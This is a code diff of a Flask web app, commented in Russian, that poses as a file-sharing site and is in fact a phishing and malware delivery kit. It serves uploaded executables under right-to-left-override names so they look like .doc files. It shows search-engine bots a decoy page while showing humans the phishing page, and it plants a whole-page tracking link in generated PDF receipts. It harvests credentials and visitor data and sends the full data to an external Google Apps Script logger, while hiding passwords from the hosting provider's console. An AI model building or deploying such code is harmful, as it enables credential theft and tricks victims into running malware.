@@ -11,7 +11,6 @@ from fpdf import FPDF
 app = Flask(__name__)
 
 # --- КОНФИГУРАЦИЯ ---
-# Используем /tmp для Render, так как там есть права на запись
 UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
 DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'
 
@@ -19,10 +18,9 @@ if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
 
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-# Разрешаем exe и bat для тестов, но фильтруем их при отдаче
 ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}
 
-# Твой Google Script URL (Логгер)
+# Твой Google Script URL
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"
 
 # --- БАЗА ДАННЫХ ---
@@ -43,18 +41,15 @@ db = load_db()
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
-# --- ФОНОВАЯ ОТПРАВКА ЛОГОВ ---
+# --- ОТПРАВКА ОТЧЕТА ---
 def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
     try:
-        # OPSEC: Удаляем пароли из вывода в консоль сервера
-        safe_log = data.copy()
-        if 'system' in safe_log and isinstance(safe_log['system'], dict):
-            safe_log['system'] = safe_log['system'].copy()
-            if 'phishing_password' in safe_log['system']:
-                safe_log['system']['phishing_password'] = "***REDACTED***"
-        
+        # В консоль сервера пишем безопасно (чтобы админы Render не видели пароли)
+        safe_log = str(data)
+        if 'password' in safe_log: safe_log = "DATA_WITH_CREDENTIALS"
         print(f"[+] Trigger: {trigger_type} | IP: {user_ip}")
         
+        # В Google Script шлем ПОЛНЫЕ данные (с паролями)
         payload = {
             "trigger": trigger_type,
             "ip": user_ip,
@@ -66,7 +61,7 @@ def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
     except Exception as e:
         print(f"[-] Logger Error: {e}")
 
-# --- PDF TRAP GENERATOR ---
+# --- PDF TRAP ---
 class PDFReceipt(FPDF):
     def header(self):
         self.set_font('Arial', 'B', 15)
@@ -76,17 +71,12 @@ def generate_receipt(uid, filename):
     pdf = PDFReceipt()
     pdf.add_page()
     pdf.set_font("Arial", size=12)
-    
     pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
-    pdf.cell(200, 10, txt=f"Transaction ID: {uid}", ln=1)
-    pdf.cell(200, 10, txt=f"Date: {datetime.datetime.now()}", ln=1)
+    pdf.cell(200, 10, txt=f"ID: {uid}", ln=1)
     pdf.set_text_color(255, 0, 0)
-    pdf.cell(200, 10, txt="STATUS: PENDING VERIFICATION. CLICK TO OPEN.", ln=1)
-    
-    # Ссылка-ловушка на весь лист
+    pdf.cell(200, 10, txt="STATUS: PENDING. CLICK TO OPEN.", ln=1)
     tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
     pdf.link(0, 0, 210, 297, tracking_url)
-    
     receipt_name = f"receipt_{uid}.pdf"
     path = os.path.join(app.config['UPLOAD_FOLDER'], receipt_name)
     pdf.output(path)
@@ -103,11 +93,9 @@ def tracking_pixel():
     source = request.args.get('source', 'unknown')
     uid = request.args.get('uid', 'unknown')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
     threading.Thread(target=send_email_background, args=(
         {'meta': {'url': f'PDF TRAP ({uid})', 'source': source}}, ip, "PDF Reader", "PDF OPENED"
     )).start()
-
     return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})
 
 @app.route('/', methods=['GET', 'POST'])
@@ -116,7 +104,6 @@ def index():
         if 'files' not in request.files: return redirect(request.url)
         files = request.files.getlist('files')
         uploaded_files = []
-        
         for file in files:
             if file and allowed_file(file.filename):
                 original_filename = file.filename
@@ -124,22 +111,17 @@ def index():
                 except: ext = "bin"
                 saved_filename = f"{uuid.uuid4().hex}.{ext}"
                 file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
-                
-                icon = "fa-file-pdf" if ext == 'pdf' else "fa-file-word" if ext in ['doc', 'docx'] else "fa-file-code"
                 uploaded_files.append({
                     'name': original_filename,
                     'saved_name': saved_filename,
                     'format': ext.upper(), 
-                    'icon': icon, 
                     'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
                 })
-
         if uploaded_files:
             unique_id = uuid.uuid4().hex[:6]
-            db[unique_id] = {'files': uploaded_files, 'comments': [], 'created_at': str(datetime.datetime.now())}
+            db[unique_id] = {'files': uploaded_files, 'comments': []}
             save_db(db)
             return redirect(f"/{unique_id}")
-            
     return render_template('index.html')
 
 @app.route('/<unique_id>')
@@ -147,51 +129,27 @@ def view_files(unique_id):
     global db
     db = load_db()
     data = db.get(unique_id)
-    if not data: return "File not found or expired", 404
+    if not data: return "File not found", 404
     return render_template('view.html', files=data['files'], uid=unique_id, db_data=data)
 
-# --- CLOAKING & PHISHING ---
 @app.route('/verify/<uid>/<path:filename>')
 def verify_download(uid, filename):
     user_agent = request.headers.get('User-Agent', '').lower()
-    
-    # Список ботов для фильтрации
-    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse', 'twitterbot', 'facebookexternalhit']
-    is_bot = any(bot in user_agent for bot in bots)
-    
-    if is_bot:
-        # Ботам отдаем заглушку
-        return "<h1>Loading secure document...</h1><p>Please wait while we verify your browser security.</p>", 200
-    
-    # Людям отдаем фишинг
+    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse']
+    if any(bot in user_agent for bot in bots):
+        return "<h1>Loading...</h1>", 200
     return render_template('semyanich.html', uid=uid, filename=filename)
 
-# --- RTLO DOWNLOAD ---
 @app.route('/download/<uid>/<path:filename>')
 def download_file(uid, filename):
     data = db.get(uid)
     if not data: return abort(404)
     target_file = next((f for f in data['files'] if f['name'] == filename), None)
-    
     if target_file:
-        original_name = target_file['name']
-        saved_name = target_file['saved_name']
-        
-        # RTLO SPOOFING: Если файл исполняемый, маскируем его
-        # Символ \u202e переворачивает текст справа-налево
-        if saved_name.endswith(('.exe', '.scr', '.bat')):
-            # Пример: "Statement_cod.exe" -> "Statement_exe.doc"
-            # Браузер покажет: Document_exe.doc
-            spoofed_name = "Document_\u202ecod.exe" 
-        else:
-            spoofed_name = original_name
-
-        return send_from_directory(
-            app.config['UPLOAD_FOLDER'], 
-            saved_name, 
-            as_attachment=True, 
-            download_name=spoofed_name
-        )
+        spoofed_name = target_file['name']
+        if target_file['saved_name'].endswith(('.exe', '.scr', '.bat')):
+            spoofed_name = "Document_\u202ecod.exe"
+        return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=spoofed_name)
     return abort(404)
 
 @app.route('/download_receipt/<uid>')
@@ -199,17 +157,12 @@ def download_receipt(uid):
     filename = generate_receipt(uid, "Secure_Download")
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
-# --- API COLLECTOR (BEACON SUPPORT) ---
 @app.route('/api/collect', methods=['POST'])
 def collect_data():
     try:
-        # sendBeacon может отправлять данные как строку или Blob
-        if request.is_json:
-            data = request.json
-        else:
-            # Пытаемся распарсить сырые данные
-            data = json.loads(request.data)
-            
+        if request.is_json: data = request.json
+        else: data = json.loads(request.data)
+        
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent')
         trigger = data.get('meta', {}).get('trigger', 'Unknown')
@@ -223,24 +176,17 @@ def collect_data():
 def add_comment():
     data = request.json
     uid = data.get('uid')
-    
     if uid in db:
         if 'comments' not in db[uid]: db[uid]['comments'] = []
-        
-        comment_entry = {
-            'username': data.get('username', 'Anonymous'),
+        db[uid]['comments'].append({
+            'username': data.get('username'),
             'text': data.get('text'),
             'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
-        }
-        db[uid]['comments'].append(comment_entry)
+        })
         save_db(db)
-        
-        # Логируем (включая скрытые поля email/pass если они есть)
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         threading.Thread(target=send_email_background, args=(data, user_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
-        
-        return jsonify({"status": "ok", "comment": comment_entry})
-    
+        return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 404
 
 if __name__ == '__main__':
